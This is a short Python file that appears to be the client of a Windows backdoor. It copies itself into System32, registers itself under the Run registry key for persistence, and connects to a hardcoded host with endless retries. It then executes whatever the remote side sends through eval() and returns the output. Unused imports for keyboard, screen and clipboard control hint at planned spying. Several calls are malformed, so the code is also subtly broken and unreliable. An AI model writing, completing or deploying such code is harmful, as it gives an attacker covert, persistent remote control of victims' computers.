import socket


"""Modules for commands"""
import pyautogui
import keyboard
import pyperclip
import shutil
import os
import sys
from tkinter import messagebox
import subprocess
import winreg   # in this we use to create startup process

"""registry things"""
filename = f"{os.path.splitext(os.path.basename(__file__))[0]}.exe"   # .exe of the file
sys.executable = filename
shutil.copyfile(os.path.dirname(__file__), f"/{filename}", f"C:\\Windows\\System32\\{filename}")
key = winreg.HKEY_CURRENT_USER
runkey = winreg.OpenKeyEx(key, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
winreg.SetValueEx(runkey, f"C:\\Windows\\System32\\{filename}")

host = "192.168.1.75"
port = 6000
def connect(s: socket):
    try:
        s.connect((host, port))
    except:
        connect(s)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    connect(s)
    while True:
        command = s.recv(2048).decode('utf-8')
        try:
            data = eval(command)
            s.send(("Return: " + str(data)).encode())
            s.send("No error occurred.".encode())
        except Exception as e:
            s.send("No return.".encode())
            s.send(("Error: " + str(e)).encode())
